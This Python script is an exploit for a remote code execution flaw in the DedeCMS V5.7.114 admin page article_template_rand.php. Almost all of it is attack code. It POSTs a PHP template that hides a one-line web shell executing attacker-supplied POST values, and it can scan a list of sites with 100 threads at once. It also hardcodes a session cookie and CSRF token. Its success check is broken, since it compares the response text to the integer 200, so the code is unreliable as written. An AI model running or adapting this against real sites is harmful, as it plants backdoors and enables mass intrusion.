import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
GREEN = '\033[92m'
RESET = '\033[0m'
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="DedeCMSV5.7.114后台article_template_rand.php存在远程代码执行漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url = target + "/dede/article_template_rand.php"
    headers ={
        'User-Agent':' Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept':' text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':' zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':' gzip, deflate, br',
        'Content-Type':' application/x-www-form-urlencoded',
        'Content-Length':' 1065',
        'Origin':' http://127.0.0.11',
        'Connection':' close',
        'Referer':' http://127.0.0.11/dede/article_template_rand.php',
        'Cookie':' menuitems=1_1%2C2_1%2C3_1; PHPSESSID=89s6bbv2d1unokav5grt4bk2g4; _csrf_name_236f0c58=8f0d4c50bfce77f693ce4b8d93af8be7; _csrf_name_236f0c581BH21ANI1AGD297L1FF21LN02BGE1DNG=23bfa72eb66439a6; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=10acd9938ef3615d; DedeLoginTime=1720185221; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d2b9bcefe628ee47; ENV_GOBACK_URL=%2Fdede%2Fsys_admin_user.php',
        'Upgrade-Insecure-Requests':' 1',
        'Sec-Fetch-Dest':' iframe',
        'Sec-Fetch-Mode':' navigate',
        'Sec-Fetch-Site':' same-origin',
        'Sec-Fetch-User':' ?1',
        'Priority':' u=4'
        }
 
    data="dopost=save&token=7fa44bfa91d7f797b4c983c76f7c9f9e&templates=%3C%3Fphp%0D%0A%0D%0A%2F%2F%E8%BF%99%E4%B8%AA%E5%80%BC%E4%B8%BA+0+%E8%A1%A8%E7%A4%BA%E5%85%B3%E9%97%AD%E6%AD%A4%E8%AE%BE%E7%BD%AE%EF%BC%8C+%E4%B8%BA+1+%E8%A1%A8%E7%A4%BA%E5%BC%80%E5%90%AF%0D%0A%24cfg_tamplate_rand+%3D+0%3B%0D%0A%0D%0A%2F%2F%E6%A8%A1%E6%9D%BF%E6%95%B0%E7%BB%84%EF%BC%8C%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E5%A2%9E%E5%8A%A0%EF%BC%8C%E6%8C%89%E8%BF%99%E4%B8%AA%E6%A0%BC%E5%BC%8F%E5%A2%9E%E5%8A%A0%E6%88%96%E4%BF%AE%E6%94%B9%E5%8D%B3%E5%8F%AF%28%E5%BF%85%E9%A1%BB%E7%A1%AE%E4%BF%9D%E8%BF%99%E4%BA%9B%E6%A8%A1%E6%9D%BF%E6%98%AF%E5%AD%98%E5%9C%A8%E7%9A%84%29%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%95%B0%E9%87%8F%E5%BF%85%E9%A1%BB%E4%B8%BA2%E4%B8%AA%E6%88%96%E4%BB%A5%E4%B8%8A%E3%80%82%0D%0A%24cfg_tamplate_arr%5B%5D+%3D+%27article_article.htm%27%3B%0D%0A%24cfg_tamplate_arr%5B%5D+%3D+%27article_article1.htm%27%3B%0D%0A%24cfg_tamplate_arr%5B%5D+%3D+%27article_article2.htm%27%3B%0D%0A%24a+%3D+%27_POST%27%3B%0D%0A%24%24a%5B1%5D%28%24%24a%5B0%5D%29%3B%0D%0A%3F%3E%0D%0A&imageField1.x=6&imageField1.y=9"
    try:
        res = requests.post(url=url,verify=False,headers=headers,data=data).text
        if res == 200:
              with open(r'cg.txt','a+') as f1:
                   f1.write(f'{target}\n')
                   print('[+++++++]'+target+'可能存在漏洞')
        else:
             print('[-]'+{target}+'可能不存在漏洞')
    except:
         print(f'[*]{target}'' is server error')

if __name__ == '__main__':
    main()
